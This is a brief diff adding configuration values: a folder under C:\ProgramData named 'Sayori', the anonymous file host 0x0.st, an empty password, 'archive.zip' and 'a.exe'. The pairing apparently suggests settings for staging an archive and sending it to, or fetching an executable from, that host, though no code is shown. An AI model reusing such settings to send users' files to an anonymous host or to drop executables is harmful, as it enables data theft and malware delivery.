@@ -1,0 +1,5 @@
+filename = "C:\\ProgramData\\Sayori\\"
+url = "http://0x0.st/"
+password = ""
+archive = "archive.zip"
+executable = "a.exe"
